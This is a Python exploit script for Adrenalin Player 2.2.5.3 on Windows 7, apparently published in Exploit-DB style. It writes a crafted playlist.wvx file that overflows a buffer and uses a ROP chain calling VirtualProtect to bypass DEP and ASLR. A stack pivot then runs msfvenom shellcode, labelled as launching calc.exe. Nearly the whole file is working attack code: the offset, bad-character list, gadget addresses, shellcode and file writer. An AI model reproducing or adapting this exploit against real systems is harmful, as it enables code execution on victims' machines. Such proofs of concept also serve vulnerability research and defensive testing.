#!/usr/bin/env python2

# Exploit Title: Adrenalin Player 2.2.5.3 (DEP+ASLR)
# Date: 03/24/2023
# Exploit Author: NG
# Tested on: Windows 7 Professional Service Pack 1 x86
# CVE : https://www.exploit-db.com/exploits/26525

import socket
import sys
import logging
import struct 

# Offset calculated with mona pattern_create and mona pattern_offset
offset=2144

badchars  = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1b\x1c\x1d\x1e\x1f\x20\x21\x22"
badchars += "\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42"
badchars += "\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62"
badchars += "\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82"
badchars += "\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2"
badchars += "\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2"
badchars += "\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2"
badchars += "\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x1006d6cf,  # RET (Filler for stack pivoting
      0x1006d6cf,  # RET (Filler for stack pivoting

      #[---INFO:gadgets_to_set_edx:---]
      0x1014b13a,  # POP EAX # RETN [AdrenalinX.dll] 
      0xffffffc0,  # -0x00000040-> eax
      0x10149bc0,  # NEG EAX # RETN    ** [AdrenalinX.dll] **
      0x1015185f,  # XCHG EAX,EDI # RETN    ** [AdrenalinX.dll] **
      0x1006a245,  # MOV EDX,EDI # POP EDI # MOV EAX,ECX # POP ESI # RETN    ** [AdrenalinX.dll] **
      0x41414141,  # Filler
      0x41414141,  # Filler


      #[---INFO:gadgets_to_set_esi:---]
      0x1013ec44,  # POP ECX # RETN [AdrenalinX.dll] 
      0x10170250,  # ptr to &VirtualProtect() [IAT AdrenalinX.dll]
      0x10058d70,  # MOV EAX,DWORD PTR DS:[ECX] # RETN    ** [AdrenalinX.dll] **
      0x1011e976,  # PUSH EAX # ADD AL,5F # POP ESI # RETN    ** [AdrenalinX.dll] **

      #[---INFO:gadgets_to_set_ebp:---]
      0x1014d5c1,  # POP EBP # RETN [AdrenalinX.dll] 
      0x10016a33,  # & push esp # ret  [AdrenalinX.dll]

      #[---INFO:gadgets_to_set_ebx:---]
      0x1014b13a,  # POP EAX # RETN [AdrenalinX.dll] 
      0xfffffcff,  # -0x00000201-> eax
      0x10149bc0,  # NEG EAX # RETN    ** [AdrenalinX.dll] **
      0x101647e6,  # XCHG EAX,EBX # RETN    ** [AdrenalinX.dll] **


      #[---INFO:gadgets_to_set_ecx:---]
      0x1011202c,  # POP ECX # RETN    ** [AdrenalinX.dll] **
      0x102b87ff,  # &Writable location [AdrenalinX.dll]

      #[---INFO:gadgets_to_set_edi:---]
      0x1001dad4,  # POP EDI # RETN    ** [AdrenalinX.dll] **
      0x10149bc2,  # RETN (ROP NOP) [AdrenalinX.dll]

      #[---INFO:gadgets_to_set_eax:---]
      0x1014b13a,  # POP EAX # RETN [AdrenalinX.dll] 
      0x90909090,  # nop

      #[---INFO:pushad:---]
      0x10017223,  # PUSHAD # RETN [AdrenalinX.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

# msfvenom -p windows/exec cmd=calc.exe -b "\x0a\x00\x0d\x1a" -f python -v shellcode
shellcode =  b""
shellcode += b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode += b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode += b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode += b"\xbe\x65\x90\xb2\x9c\xd9\xec\xd9\x74\x24\xf4"
shellcode += b"\x5a\x2b\xc9\xb1\x31\x31\x72\x13\x03\x72\x13"
shellcode += b"\x83\xc2\x61\x72\x47\x60\x81\xf0\xa8\x99\x51"
shellcode += b"\x95\x21\x7c\x60\x95\x56\xf4\xd2\x25\x1c\x58"
shellcode += b"\xde\xce\x70\x49\x55\xa2\x5c\x7e\xde\x09\xbb"
shellcode += b"\xb1\xdf\x22\xff\xd0\x63\x39\x2c\x33\x5a\xf2"
shellcode += b"\x21\x32\x9b\xef\xc8\x66\x74\x7b\x7e\x97\xf1"
shellcode += b"\x31\x43\x1c\x49\xd7\xc3\xc1\x19\xd6\xe2\x57"
shellcode += b"\x12\x81\x24\x59\xf7\xb9\x6c\x41\x14\x87\x27"
shellcode += b"\xfa\xee\x73\xb6\x2a\x3f\x7b\x15\x13\xf0\x8e"
shellcode += b"\x67\x53\x36\x71\x12\xad\x45\x0c\x25\x6a\x34"
shellcode += b"\xca\xa0\x69\x9e\x99\x13\x56\x1f\x4d\xc5\x1d"
shellcode += b"\x13\x3a\x81\x7a\x37\xbd\x46\xf1\x43\x36\x69"
shellcode += b"\xd6\xc2\x0c\x4e\xf2\x8f\xd7\xef\xa3\x75\xb9"
shellcode += b"\x10\xb3\xd6\x66\xb5\xbf\xfa\x73\xc4\x9d\x90"
shellcode += b"\x82\x5a\x98\xd6\x85\x64\xa3\x46\xee\x55\x28"                                                                                                                                  
shellcode += b"\x09\x69\x6a\xfb\x6e\x85\x20\xa6\xc6\x0e\xed"                                                                                                                                  
shellcode += b"\x32\x5b\x53\x0e\xe9\x9f\x6a\x8d\x18\x5f\x89"                                                                                                                                  
shellcode += b"\x8d\x68\x5a\xd5\x09\x80\x16\x46\xfc\xa6\x85"                                                                                                                                  
shellcode += b"\x67\xd5\xc4\x48\xf4\xb5\x24\xef\x7c\x5f\x39"


rop_chain = create_rop_chain()

stack_pivot= struct.pack('<I',0x10119edf) 

# 0x10119edf : {pivot 2048 / 0x800} :  # ADD ESP,800 # RETN    ** [AdrenalinX.dll] **

buf  = "A"*692

buf += rop_chain
buf += shellcode

buf += "B" * ( offset - len(rop_chain) - len(shellcode) - 692)
#buf += "B" * ( offset - len(rop_chain) - 692)

buf += stack_pivot 
buf += "C"* 400
buf += '\r\n'


f = open("playlist.wvx","w")
f.write(buf)
f.close()